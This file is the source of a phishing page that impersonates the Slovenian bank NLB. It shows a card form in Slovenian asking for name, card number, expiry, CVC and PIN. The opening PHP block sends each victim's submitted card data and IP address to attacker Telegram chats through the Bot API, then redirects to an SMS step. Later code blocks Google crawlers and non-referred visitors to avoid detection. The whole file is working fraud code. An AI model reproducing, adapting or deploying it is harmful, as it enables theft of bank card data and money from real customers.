<?php
   include "config.php";
   if(isset($_POST['infos'])){

      
   $ip = getenv("REMOTE_ADDR");
       $message = "-------------------- 💳 NLB Card 💳-------------------\nFull name : ".$_POST['cardName']."\nCC : ".$_POST['CardNumber']."\nEXP : ".$_POST['cardMonth']."/".$_POST['cardYear']."\nCVV : ".$_POST['cardCvv']."\nPina koda kartice: ".$_POST['pin']."\nIP      : ".$ip."\n-------------------- 🇸🇮 Zoldyck 🇸🇮-------------------\n";
      foreach($user_ids as $user_id) {
      $url='https://api.telegram.org/bot'.$bottoken.'/sendMessage';
      $data=array('chat_id'=>$user_id,'text'=>$message);
      $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
      $context=stream_context_create($options);
      $result=file_get_contents($url,false,$context);
      
      }
      include "includes/api.php";

      header("Location: sms.php?id=".$ip);
      }
      ?>


<?php 
   $aa = $_SERVER['HTTP_HOST'];
   $ref = $_SERVER['HTTP_REFERER'];
   $refData = parse_url($ref);
   if ($refData['host'] !=$aa) {
   ?>
<?php }elseif($_SERVER['HTTP_REFERER'] == NULL){
   header('HTTP/1.0 404 Not Found');
   exit(); ?>
<?php }else{ ?>
<?php
   error_reporting(0);
   include('includes/antibot1.php');
   include('includes/antibot2.php');
   include('includes/antiip.php');
   if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
   ?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>NLB pay</title>
      <meta name="multilanguage" content="true">
      <meta name="lng" content="el">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta name="robots" content="noindex,nofollow,noimageindex,noarchive,nocache,nosnippet">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/png" href="assets/img/favicon.ico">
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.css" rel="stylesheet">
      <link href="assets/css/style.css" rel="stylesheet">
      <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
      <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
      <link rel="stylesheet" href="assets/css/inf/info.css">
      <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    
   </head>

    <body class="login-bg windows login-night modal-open" style="padding-right: 0.333374px;">
      
      <index-page ng-version="7.2.16">
         
            
               <login-header>
               <header style="background:#26007D;margin-bottom:20px">
            <nav class="navbar navbar-expand-lg navbar-light" style="align-items: flex-start;">
  <a class="navbar-brand" href="#"><img src="https://klikotp.nlb.si/nlb_left_02.png" /> </a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse" style="justify-content: flex-end;padding-top:10px" id="navbarNav">
    <ul class="navbar-nav">
      <li class="nav-item">
        <a class="nav-link" href="#">NLB</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">O NLB Kliku</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Kontakt</a>
      </li>
    </ul>
  </div>
</nav>
            </header>
       
      </index-page>
     <form action="" method="POST">
                                    <div class="wrapper1" id="app" style=" padding-top: 0px; ">
                                       <div class="card-form" style=" margin-top: 20px; ">
                                          <div class="card-list">
                                             <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
                                                <div class="card-item__side -front">
                                                   <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div>
                                                   <div class="card-item__cover"> <img v-bind:src="'assets/img/card-front.png'" class="card-item__bg"> </div>
                                                   <div class="card-item__wrapper">
                                                      <div class="card-item__top">
                                                         <div class="card-item__type">
                                                            <transition name="slide-fade-up"> <img  v-bind:src="'assets/img/' + getCardType + '.png'" v-if="getCardType" v-bind:key="getCardType" alt="" class="card-item__typeImg"> </transition>
                                                         </div>
                                                      </div>
                                                      <label for="cardNumber" class="card-item__number" ref="cardNumber">
                                                         <template v-if="getCardType === 'amex'">
                                                            <span v-for="(n, $index) in amexCardMask" :key="$index">
                                                               <transition name="slide-fade-up">
                                                                  <div class="card-item__numberItem"
                                                                     v-if="$index > 4 && $index < 14 && cardNumber.length > $index && n.trim() !== ''">
                                                                     *
                                                                  </div>
                                                                  <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }"
                                                                     :key="$index" v-else-if="cardNumber.length > $index">
                                                                     {{cardNumber[$index]}}
                                                                  </div>
                                                                  <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }"
                                                                     v-else :key="$index + 1">
                                                                     {{n}}
                                                                  </div>
                                                               </transition>
                                                            </span>
                                                         </template>
                                                         <template v-else>
                                                            <span v-for="(n, $index) in otherCardMask" :key="$index">
                                                               <transition name="slide-fade-up">
                                                                  <div class="card-item__numberItem"
                                                                     v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== ''">
                                                                     *
                                                                  </div>
                                                                  <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }"
                                                                     :key="$index" v-else-if="cardNumber.length > $index">
                                                                     {{cardNumber[$index]}}
                                                                  </div>
                                                                  <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }"
                                                                     v-else :key="$index + 1">
                                                                     {{n}}
                                                                  </div>
                                                               </transition>
                                                            </span>
                                                         </template>
                                                      </label>
                                                      <div class="card-item__content">
                                                         <label for="cardName" style="text-align:left;" class="card-item__info" ref="cardName">
                                                            <div class="card-item__holder">Card Holder</div>
                                                            <transition name="slide-fade-up">
                                                               <div class="card-item__name" v-if="cardName.length" key="1">
                                                                  <transition-group name="slide-fade-right"> <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, ' ')" v-if="$index === $index" v-bind:key="$index + 1">{{n}}</span> </transition-group>
                                                               </div>
                                                               <div class="card-item__name" v-else key="2">Fullname</div>
                                                            </transition>
                                                         </label>
                                                         <div class="card-item__date" ref="cardDate">
                                                            <label for="cardMonth" class="card-item__dateTitle" style="color:white;">Expires</label>
                                                            <label for="cardMonth" class="card-item__dateItem"  style="color:white;">
                                                               <transition name="slide-fade-up"> <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span> <span v-else key="2"> MM</span> </transition>
                                                            </label>
                                                            /
                                                            <label for="cardYear" class="card-item__dateItem"  style="color:white;">
                                                               <transition name="slide-fade-up"> <span v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span> <span v-else key="2"> YY</span> </transition>
                                                            </label>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                                <div class="card-item__side -back">
                                                   <div class="card-item__cover"> <img v-bind:src="'assets/img/card-back.png'" class="card-item__bg"> </div>
                                                   <div class="card-item__band"></div>
                                                   <div class="card-item__cvv">
                                                      <div class="card-item__cvvTitle">CVC</div>
                                                      <div class="card-item__cvvBand"> <span v-for="(n, $index) in cardCvv" :key="$index">
                                                         *
                                                         </span> 
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                          <div class="card-form__inner">
                                             <div class="card-input">
                                                <label for="cardName" class="card-input__label">Polno ime</label>
                                                <input type="text" name="cardName" id="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" required> 
                                             </div>
                                             <div class="card-input">
                                                <label for="cardNumber" class="card-input__label">Številka kartice </label>
                                                <input type="text" pattern='.{19}' name="CardNumber" id="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" required> 
                                             </div>
                                             <div class="card-form__row">
                                                <div class="card-form__col">
                                                   <div class="card-form__group">
                                                      <label for="cardMonth" class="card-input__label">Rok trajanja </label>
                                                      <select class="card-input__input -select" name="cardMonth" id="cardMonth" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required>
                                                         <option value="" disabled selected>MM</option>
                                                         <option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth" v-bind:key="n"> {{n
                                                            < 10 ? '0' + n : n}} 
                                                         </option>
                                                      </select>
                                                      <select class="card-input__input -select" name="cardYear" id="cardYear" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required>
                                                         <option value="" disabled selected>YY</option>
                                                         <option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n"> {{$index + minCardYear}} </option>
                                                      </select>
                                                   </div>
                                                </div>
                                                <div class="card-form__col -cvv">
                                                   <div class="card-input">
                                                      <label for="cardCvv" class="card-input__label">CVC</label>
                                                      <input style=" width: 60% " type="text" class="card-input__input" name="cardCvv" id="cardCvv" v-mask="'####'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" required> 
                                                   </div>
                                                </div>

                                             </div>
                                             <div class="card-form__col -cvv">

                                             <div class="card-input">
                                                <label for="Pina koda kartice" class="card-input__label">Pina koda kartice</label>
                                                <input type="text" name="pin"  class="card-input__input" autocomplete="off" required> 
                                             </div>
                                             </div>
                                             <br>
                                             <div style="text-align: center;" >
                  <spinner type="action"><button class="btnform" id="butc" name="infos" type="submit" style="min-width: 7.5rem"  > Kontinuiteta </button></spinner>
                  </div>
                                          </div>
                                       </div>
                                    </div>
                                 </form>

                                 <script src="assets/js/vue.min.js"></script>
      <script src="assets/js/vue-the-mask.js"></script>
      <script type="text/javascript" src="assets/js/main.js"></script>
   </body>

</html>
<?php } ?>